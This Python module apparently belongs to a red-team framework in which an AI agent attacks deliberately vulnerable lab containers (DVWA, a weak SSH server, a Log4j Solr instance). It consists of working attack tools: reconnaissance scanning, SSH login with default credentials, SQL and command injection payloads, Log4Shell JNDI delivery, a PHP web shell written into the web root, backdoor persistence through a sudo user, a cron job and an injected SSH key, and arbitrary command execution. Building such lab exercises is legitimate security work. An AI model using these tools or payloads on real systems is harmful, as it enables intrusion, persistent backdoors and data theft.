"""Red team attack tools — offensive operations against CyberOrion targets.

Eight structured attack tools. Host-level attacks (nmap, curl, sshpass) run
on the WSL host via ``subprocess``; container actions run via ``docker exec``.
All tools are decorated with ``@function_tool`` (so the agent can call them)
and ``@_tracked`` (so every invocation is recorded in ``TOOL_CALL_LOG``).
Red tools never write to the vulnerability ledger — that is the blue team's
responsibility.
"""

from __future__ import annotations

import re
import urllib.parse

import requests

from cai.sdk.agents import function_tool

from ._common import (
    DVWA_CONTAINER, SSH_CONTAINER, LOG4J_CONTAINER,
    DVWA_HOST, DVWA_HOST_PORT,
    TARGET_DVWA_IP, TARGET_SSH_IP, TARGET_LOG4J_IP,
    LOG4J_HOST_PORT,
    _docker_exec, _tracked, _resolve_container, _run,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _resolve_host(target: str) -> str:
    """Map a friendly target name to an IP address."""
    t = (target or "").strip().lower()
    if t in ("", "dvwa", "web"):
        return TARGET_DVWA_IP
    if t in ("ssh", "weak_ssh"):
        return TARGET_SSH_IP
    if t in ("log4j", "solr"):
        return TARGET_LOG4J_IP
    return target


def _dvwa_base(url: str) -> str:
    """Extract scheme://host:port from a full DVWA page URL."""
    parsed = urllib.parse.urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _red_dvwa_session(url: str) -> requests.Session:
    """Log into DVWA (admin/password) and return an authenticated session."""
    base = _dvwa_base(url)
    s = requests.Session()
    try:
        s.get(f"{base}/login.php", timeout=10)
        s.post(
            f"{base}/login.php",
            data={"username": "admin", "password": "password", "Login": "Login"},
            timeout=10,
        )
    except requests.RequestException:
        pass
    return s


# ---------------------------------------------------------------------------
# 1. recon_scan
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def recon_scan(target: str = "dvwa", ports: str = "1-1000") -> str:
    """Red team reconnaissance: nmap scan run from the WSL host.

    Args:
        target: "dvwa", "ssh", "log4j", or any IP/hostname.
        ports: Port range string passed to nmap -p (default "1-1000").

    Returns:
        Structured string: "OPEN PORTS: ...\nSERVICES: ...".
    """
    host = _resolve_host(target)
    ports = (ports or "1-1000").strip()

    rc, out, err = _run(
        ["nmap", "-Pn", "-T4", "-sT", "-p", ports, "--open", host],
        timeout=120,
    )

    open_ports = []
    services = []
    if out:
        for line in out.splitlines():
            m = re.match(
                r'^(\d+)/(tcp|udp)\s+(\w+)\s+(\S+)\s*(.*)$', line.strip()
            )
            if m and m.group(3).lower() == "open":
                port, _proto, state, service, version = m.groups()
                open_ports.append(f"{port}/{state}/{service}")
                if version.strip():
                    services.append(version.strip())

    if not open_ports:
        # Fallback: bash /dev/tcp probe for common ports when nmap is absent
        for p in (22, 80, 443, 3306, 8080, 8983, 28080):
            prc, pout, _ = _run(
                f"timeout 2 bash -c '</dev/tcp/{host}/{p}' 2>/dev/null && echo OPEN",
                timeout=6,
            )
            if "OPEN" in (pout or ""):
                open_ports.append(f"{p}/open/unknown")

    if not open_ports:
        return f"OPEN PORTS: (none found on {host})\nSERVICES: (none)"

    ports_str = ", ".join(open_ports)
    services_str = ", ".join(services) if services else "(no version info)"
    return f"OPEN PORTS: {ports_str}\nSERVICES: {services_str}"


# ---------------------------------------------------------------------------
# 2. attack_ssh
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def attack_ssh(
    host: str = "localhost",
    port: int = 22222,
    username: str = "ctf",
    password: str = "ctf",
    command: str = "cat /home/ctf/flag.txt",
) -> str:
    """Red team SSH access: run a command on the target via sshpass.

    Args:
        host: SSH host (default "localhost").
        port: SSH port (default 22222).
        username: SSH username.
        password: SSH password.
        command: Command to execute on the target (default reads the flag).

    Returns:
        "SSH LOGIN: SUCCESS\nFLAG: ..." or "SSH LOGIN: FAILED - ...".
    """
    rc, out, err = _run(
        ["sshpass", "-p", password, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "UserKnownHostsFile=/dev/null",
         "-o", "ConnectTimeout=8",
         "-o", "PreferredAuthentications=password",
         "-o", "PubkeyAuthentication=no",
         "-o", "NumberOfPasswordPrompts=1",
         "-p", str(port), "-l", username, host, command],
        timeout=20,
    )

    output = (out or "").strip()
    err_text = (err or "").strip()

    if rc == 0 or output:
        # Auto-judge: look for flag / uid= / data
        flags = re.findall(r'FLAG\{[^}]*\}', output, re.IGNORECASE)
        uid_match = re.search(r'uid=\d+\([\w-]+\)', output)
        parts = ["SSH LOGIN: SUCCESS"]
        if flags:
            parts.append("FLAG: " + ", ".join(flags))
        if uid_match:
            parts.append(f"UID: {uid_match.group(0)}")
        if not flags and not uid_match:
            snippet = output[:200] if output else "(empty output)"
            parts.append(f"OUTPUT: {snippet}")
        return "\n".join(parts)

    reason = "Permission denied" if "permission denied" in err_text.lower() else err_text[:120]
    return f"SSH LOGIN: FAILED - {reason}"


# ---------------------------------------------------------------------------
# 3. attack_sqli
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def attack_sqli(
    url: str = "",
    payload: str = "' OR '1'='1' -- ",
) -> str:
    """Red team SQL injection against a DVWA sqli page.

    Logs into DVWA first, then sends the injection payload.

    Args:
        url: DVWA sqli page URL (e.g. http://127.0.0.1:28080/vulnerabilities/sqli/).
        payload: SQL injection payload (default classic OR-bypass).

    Returns:
        "SQLI: SUCCESS - Data leaked: ..." or "SQLI: FAILED - ...".
    """
    if not url:
        url = f"http://{DVWA_HOST}:{DVWA_HOST_PORT}/vulnerabilities/sqli/"
    base = _dvwa_base(url)
    parsed = urllib.parse.urlparse(url)
    sqli_path = parsed.path or "/vulnerabilities/sqli/"

    s = _red_dvwa_session(url)
    target = f"{base}{sqli_path}?{urllib.parse.urlencode({'id': payload, 'Submit': 'Submit'})}"

    try:
        r = s.get(target, timeout=15)
    except requests.RequestException as exc:
        return f"SQLI: FAILED - request error: {exc}"

    body = r.text or ""
    low = body.lower()

    # Auto-judge: DVWA sqli returns "First name" / "Surname" rows on success
    if "first name" in low and "surname" in low:
        pre = re.search(r'<pre>(.*?)</pre>', body, re.DOTALL)
        detail = pre.group(1).strip()[:300] if pre else "admin row present"
        return f"SQLI: SUCCESS - Data leaked: {detail}"

    if "admin" in low:
        return f"SQLI: SUCCESS - Data leaked: admin references found (HTTP {r.status_code})"

    if "sql syntax" in low or "error" in low:
        return f"SQLI: FAILED - SQL error in response (HTTP {r.status_code})"

    return f"SQLI: FAILED - No data in response (HTTP {r.status_code})"


# ---------------------------------------------------------------------------
# 4. attack_cmd_injection
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def attack_cmd_injection(
    url: str = "",
    command: str = "id",
) -> str:
    """Red team command injection against a DVWA exec page.

    Logs into DVWA first, then injects a shell command via the ping input.

    Args:
        url: DVWA command-injection page URL.
        command: Shell command to inject (default "id").

    Returns:
        "CMD INJECTION: SUCCESS - uid=..." or "CMD INJECTION: FAILED".
    """
    if not url:
        url = f"http://{DVWA_HOST}:{DVWA_HOST_PORT}/vulnerabilities/exec/"
    base = _dvwa_base(url)
    parsed = urllib.parse.urlparse(url)
    exec_path = parsed.path or "/vulnerabilities/exec/"

    s = _red_dvwa_session(url)
    target = f"{base}{exec_path}"
    # DVWA exec does: shell_exec('ping -c 4 ' . $ip) -> inject "; <command>"
    inject = f"127.0.0.1; {command}"

    try:
        r = s.post(
            target,
            data={"ip": inject, "Submit": "Submit"},
            timeout=15,
        )
    except requests.RequestException as exc:
        return f"CMD INJECTION: FAILED - request error: {exc}"

    body = r.text or ""

    # Auto-judge: look for uid= / root/ / command output markers
    uid_match = re.search(r'uid=\d+\([\w-]+\).*', body)
    if uid_match:
        return f"CMD INJECTION: SUCCESS - {uid_match.group(0).strip()[:200]}"

    # Extract <pre> block which holds ping + command output
    pre = re.search(r'<pre>(.*?)</pre>', body, re.DOTALL)
    if pre:
        text = pre.group(1).strip()
        if "PING" in text or "bytes" in text or "uid=" in text or "root" in text:
            return f"CMD INJECTION: SUCCESS - {text[:300]}"

    return f"CMD INJECTION: FAILED (HTTP {r.status_code})"


# ---------------------------------------------------------------------------
# 5. attack_log4j
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def attack_log4j(
    url: str = "",
    payload_type: str = "header",
) -> str:
    """Red team Log4Shell (CVE-2021-44228) JNDI payload delivery.

    Args:
        url: Solr admin URL (or any Log4j-using endpoint).
        payload_type: "header" (send JNDI in HTTP header) or "param" (query param).

    Returns:
        "LOG4J: PAYLOAD DELIVERED - HTTP 200, JNDI string processed" or "LOG4J: FAILED".
    """
    if not url:
        url = f"http://127.0.0.1:{LOG4J_HOST_PORT}/solr/admin/"

    jndi = "${jndi:ldap://127.0.0.1:1389/exp}"
    headers = {"User-Agent": "red-team-scan"}
    payload_type = (payload_type or "header").strip().lower()

    try:
        if payload_type == "header":
            headers["X-Api-Version"] = jndi
            headers["Referer"] = jndi
            r = requests.get(url, headers=headers, timeout=15)
        else:
            r = requests.get(
                url, headers=headers,
                params={"q": jndi, "version": jndi},
                timeout=15,
            )
    except requests.RequestException as exc:
        return f"LOG4J: FAILED - request error: {exc}"

    if r.status_code == 200:
        return f"LOG4J: PAYLOAD DELIVERED - HTTP {r.status_code}, JNDI string processed"
    if r.status_code in (301, 302, 401, 403):
        return f"LOG4J: PARTIAL - HTTP {r.status_code} (endpoint reached, payload may have been logged)"
    return f"LOG4J: FAILED - HTTP {r.status_code}"


# ---------------------------------------------------------------------------
# 6. upload_webshell
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def upload_webshell(
    url: str = "",
    shell_name: str = "shell.php",
) -> str:
    """Red team persistence: upload a PHP webshell via DVWA command injection.

    Writes ``<?php system($_GET["c"]); ?>`` into the DVWA web root through
    the command-injection vulnerability, then verifies it by executing ``id``.

    Args:
        url: DVWA command-injection page URL.
        shell_name: Filename for the webshell (default "shell.php").

    Returns:
        "WEBSHELL: UPLOADED and VERIFIED at /shell.php - uid=..." or "WEBSHELL: FAILED".
    """
    if not url:
        url = f"http://{DVWA_HOST}:{DVWA_HOST_PORT}/vulnerabilities/exec/"
    base = _dvwa_base(url)
    parsed = urllib.parse.urlparse(url)
    exec_path = parsed.path or "/vulnerabilities/exec/"

    # Sanitize shell_name to a safe filename
    shell_name = re.sub(r'[^A-Za-z0-9._-]', '', shell_name) or "shell.php"
    web_path = f"/var/www/html/{shell_name}"

    # Build the injection that writes the webshell
    webshell_php = '<?php system($_GET["c"]); ?>'
    inject = f"127.0.0.1; echo '{webshell_php}' > {web_path}"

    s = _red_dvwa_session(url)
    target = f"{base}{exec_path}"
    try:
        s.post(target, data={"ip": inject, "Submit": "Submit"}, timeout=15)
    except requests.RequestException as exc:
        return f"WEBSHELL: FAILED - inject request error: {exc}"

    # Verify by accessing the webshell and running id
    verify_url = f"{base}/{shell_name}?c=id"
    try:
        r = s.get(verify_url, timeout=15)
    except requests.RequestException as exc:
        return f"WEBSHELL: FAILED - verify request error: {exc}"

    body = r.text or ""
    uid_match = re.search(r'uid=\d+\([\w-]+\)', body)
    if uid_match:
        return f"WEBSHELL: UPLOADED and VERIFIED at /{shell_name} - {uid_match.group(0)}"

    if r.status_code == 200 and "system" not in body.lower():
        return f"WEBSHELL: UPLOADED but unverified at /{shell_name} (HTTP 200, no uid in output)"

    return f"WEBSHELL: FAILED (HTTP {r.status_code})"


# ---------------------------------------------------------------------------
# 7. establish_persistence
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def establish_persistence(
    target: str = "ssh",
    method: str = "add_user",
) -> str:
    """Red team persistence: plant a backdoor on a compromised target.

    Args:
        target: "ssh" or "dvwa" (container to persist on).
        method: One of:
            - "add_user": create a backdoor user with sudo rights
            - "cron": plant a cron job callback
            - "ssh_key": inject an authorized_keys entry

    Returns:
        "PERSISTENCE: ESTABLISHED via <method> - ..." or failure message.
    """
    container = _resolve_container(target)
    method = (method or "add_user").strip().lower()

    if method == "add_user":
        # Create backdoor user with a known password and sudo NOPASSWD
        cmd = (
            "id backdoor 2>/dev/null || useradd -m -s /bin/bash backdoor; "
            "echo 'backdoor:backdoor123' | chpasswd 2>/dev/null; "
            "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor 2>/dev/null; "
            "chmod 0440 /etc/sudoers.d/backdoor 2>/dev/null; "
            "id backdoor"
        )
        rc, out, err = _docker_exec(container, cmd, timeout=20)
        if rc == 0 and "backdoor" in (out or ""):
            return "PERSISTENCE: ESTABLISHED via add_user - backdoor user 'backdoor' created"
        return f"PERSISTENCE: FAILED via add_user - {(err or out).strip()[:120]}"

    if method == "cron":
        # Plant a cron job that writes a marker every minute
        cmd = (
            "echo '* * * * * root /bin/bash -c \"echo PERSIST > /tmp/cron_backdoor_marker\"' "
            "> /etc/cron.d/backdoor 2>/dev/null; "
            "chmod 0644 /etc/cron.d/backdoor 2>/dev/null; "
            "cat /etc/cron.d/backdoor"
        )
        rc, out, err = _docker_exec(container, cmd, timeout=15)
        if rc == 0 and "backdoor" in (out or ""):
            return "PERSISTENCE: ESTABLISHED via cron - /etc/cron.d/backdoor planted"
        return f"PERSISTENCE: FAILED via cron - {(err or out).strip()[:120]}"

    if method == "ssh_key":
        # Generate a keypair on the WSL host and inject the public key
        key_path = "/tmp/cyberorion_backdoor_key"
        gen_rc, gen_out, gen_err = _run(
            f"rm -f {key_path} {key_path}.pub; "
            f"ssh-keygen -t rsa -b 2048 -N '' -f {key_path} -q",
            timeout=15,
        )
        if gen_rc != 0:
            return f"PERSISTENCE: FAILED via ssh_key - keygen failed: {gen_err.strip()[:100]}"
        pub_rc, pub_out, _ = _run(["cat", f"{key_path}.pub"], timeout=5)
        pub_key = (pub_out or "").strip()
        if not pub_key:
            return "PERSISTENCE: FAILED via ssh_key - could not read public key"

        escaped = pub_key.replace("'", "'\\''")
        # Write into root's authorized_keys (fall back to ctf)
        cmd = (
            "mkdir -p /root/.ssh && chmod 700 /root/.ssh; "
            f"echo '{escaped}' >> /root/.ssh/authorized_keys; "
            "chmod 600 /root/.ssh/authorized_keys; "
            "tail -1 /root/.ssh/authorized_keys"
        )
        rc, out, err = _docker_exec(container, cmd, timeout=15)
        if rc == 0 and "ssh-rsa" in (out or ""):
            return (f"PERSISTENCE: ESTABLISHED via ssh_key - "
                    f"authorized_keys injected (private key at {key_path})")
        cmd2 = (
            "mkdir -p /home/ctf/.ssh && chmod 700 /home/ctf/.ssh; "
            f"echo '{escaped}' >> /home/ctf/.ssh/authorized_keys; "
            "chmod 600 /home/ctf/.ssh/authorized_keys; "
            "tail -1 /home/ctf/.ssh/authorized_keys"
        )
        rc2, out2, err2 = _docker_exec(container, cmd2, timeout=15)
        if rc2 == 0 and "ssh-rsa" in (out2 or ""):
            return (f"PERSISTENCE: ESTABLISHED via ssh_key - "
                    f"authorized_keys injected for ctf (private key at {key_path})")
        return f"PERSISTENCE: FAILED via ssh_key - {(err or err2).strip()[:120]}"

    return f"PERSISTENCE: FAILED - unknown method {method!r}; use add_user|cron|ssh_key"


# ---------------------------------------------------------------------------
# 8. execute_payload
# ---------------------------------------------------------------------------

@function_tool
@_tracked
def execute_payload(
    payload: str,
    target: str = "dvwa",
) -> str:
    """Red team payload execution: run a custom command inside a target container.

    Args:
        payload: Shell command to execute via docker exec.
        target: Target container ("dvwa", "ssh", "log4j", or a container name).

    Returns:
        Raw command output plus an auto-judged verdict (flag/uid/data extracted).
    """
    if not payload or not payload.strip():
        return "EXECUTE PAYLOAD: FAILED - empty payload"

    container = _resolve_container(target)
    rc, out, err = _docker_exec(container, payload, timeout=60)
    text = (out or "").strip()
    err_text = (err or "").strip()
    combined = text + ("\n" + err_text if err_text else "")

    # Auto-judge: extract flags / uid / data
    verdict_parts = []
    flags = re.findall(r'FLAG\{[^}]*\}', combined, re.IGNORECASE)
    if flags:
        verdict_parts.append("FLAG: " + ", ".join(flags))
    uid_match = re.search(r'uid=\d+\([\w-]+\)', combined)
    if uid_match:
        verdict_parts.append(f"UID: {uid_match.group(0)}")

    if verdict_parts:
        verdict = " | ".join(verdict_parts)
        return f"EXECUTE PAYLOAD: SUCCESS - {verdict}\n--- OUTPUT ---\n{combined[:1500]}"
    if rc == 0 and combined:
        return f"EXECUTE PAYLOAD: EXECUTED (exit=0)\n--- OUTPUT ---\n{combined[:1500]}"
    if rc == 0:
        return "EXECUTE PAYLOAD: EXECUTED (exit=0, no output)"
    return f"EXECUTE PAYLOAD: FAILED (exit={rc})\n--- OUTPUT ---\n{combined[:1500]}"
